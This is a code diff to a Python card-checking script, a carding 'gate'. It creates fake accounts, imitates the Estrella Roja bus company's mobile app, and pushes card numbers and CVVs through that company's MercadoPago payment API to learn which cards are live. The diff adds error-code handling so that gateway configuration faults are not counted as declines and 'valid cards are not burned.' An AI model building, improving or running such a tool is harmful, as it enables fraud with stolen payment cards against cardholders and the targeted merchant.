@@ -40,6 +40,11 @@ _EMAIL_DOMS = ('gmail.com', 'outlook.com', 'hotmail.com')
 
 _LIVE_KEYS = ('insufficient', 'security_code_incorrect', 'cc_rejected_bad_filled', 'call_for_authorize')
 
+# MercadoPago error codes that are NOT declines of the card itself but rather
+# integration/credential/config problems on the gateway side. Report these as
+# 'Error ⚠️' (gate config) instead of 'Declined ❌' so valid cards are not burned.
+_MP_INFRA_CODES = ('10102', '106', '2002', '2006', '3006', '3008', '3009', '3010', '4000', '4001', '4002', '4003')
+
 _f = Faker('es_MX')
 
 def _ascii(text: str) -> str:
@@ -87,6 +92,22 @@ def _register_account(model: curl.Session) -> str:
     if not token:
         raise Exception(f'Login falló ({r3.status_code}): {r3.text[:80]}')
     return token
+
+def _mp_code(mp_j) -> str:
+    """Extract the numeric error code from a MercadoPago error payload
+    (e.g. 'cause[0].code' -> '10102'). Returns '' if none present."""
+    if isinstance(mp_j, str):
+        try:
+            mp_j = json.loads(mp_j)
+        except Exception:
+            return ''
+    if not isinstance(mp_j, dict):
+        return ''
+    causes = mp_j.get('cause')
+    if isinstance(causes, list) and causes and isinstance(causes[0], dict):
+        return str(causes[0].get('code', ''))
+    return ''
+
 
 def _mp_error(mp_j: dict) -> str:
     """Extract a readable decline message from a MercadoPago error payload.
@@ -139,6 +160,8 @@ def _flow(num, mes, ano, cvv, retries: int=0) -> dict:
         if not mp_tok or mp_j.get('status') != 'active':
             cause = _mp_error(mp_j)
             msg = f"MP Token Rejected: {mp_j.get('status', 'unknown')}" + (f' | {cause}' if cause else '')
+            if _mp_code(mp_j) in _MP_INFRA_CODES:
+                return {'status': False, 'success': False, 'message': f'Gate config error: {msg}', 'card': card_str}
             return {'status': True, 'success': False, 'message': msg, 'card': card_str}
         plain = json.dumps({'customer': {'customerId': _CUSTOMER_ID, 'email': data.mail, 'name': data.f_name, 'lastName': data.l_name, 'phone': data.phone, 'zipCode': data.zipcode}, 'card': {'name': f'{data.f_name} {data.l_name}', 'number': '', 'securityCode': '', 'token': mp_tok}})
         headers2 = {'Host': 'apicloud.estrellaroja.com.mx', 'Accept': 'application/json, text/plain, */*', 'Authorization': f'Bearer {jwt}', 'Content-Type': 'application/json', 'Origin': 'https://localhost', 'X-Requested-With': 'com.estrellaroja.aeropuerto', 'Referer': 'https://localhost/'}
@@ -147,6 +170,10 @@ def _flow(num, mes, ano, cvv, retries: int=0) -> dict:
         if request2.status_code not in (200, 201):
             rj = request2.json() if request2.text else {}
             msg = _mp_error(rj) or rj.get('message') or rj.get('error') or rj.get('description') or rj.get('Error') or request2.text[:150]
+            if _mp_code(rj) in _MP_INFRA_CODES:
+                # Credentials/customer/token config problem on the gateway side:
+                # not a decline of the card, flag it as a gate error.
+                return {'status': False, 'success': False, 'message': f'Gate config error: {msg}', 'card': card_str}
             return {'status': True, 'success': False, 'message': str(msg), 'card': card_str}
         headers3 = {'Host': 'apicloud.estrellaroja.com.mx', 'Accept': 'application/json, text/plain, */*', 'Authorization': f'Bearer {jwt}', 'Origin': 'https://localhost', 'X-Requested-With': 'com.estrellaroja.aeropuerto'}
         request3 = model.get(f'{_SITE_URL}/siverpd/api/v1/payment/customer-cards?servicioId={_SERVICE_ID}&clientId={_CUSTOMER_ID}', headers=headers3, timeout=15)
